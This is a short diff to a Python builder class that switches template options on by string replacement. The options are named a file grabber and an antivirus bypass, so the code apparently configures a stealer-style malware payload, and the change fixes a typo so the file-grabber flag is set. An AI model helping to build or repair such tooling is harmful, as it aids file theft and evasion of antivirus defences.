@@ -148,7 +148,7 @@ class Builder():
             data = f.read()
 
         if self.fileGrab == "Y" or self.fileGrab == "y":
-            data = data.replace('enableFileGrabber = False #enable file grabber', 'enableFileGrubber = True')
+            data = data.replace('enableFileGrabber = False #enable file grabber', 'enableFileGrabber = True')
 
         if self.avBypass == "Y" or self.avBypass == "y":
             data = data.replace('avbypass = False #enable antiviruses bypass', 'avbypass = True')
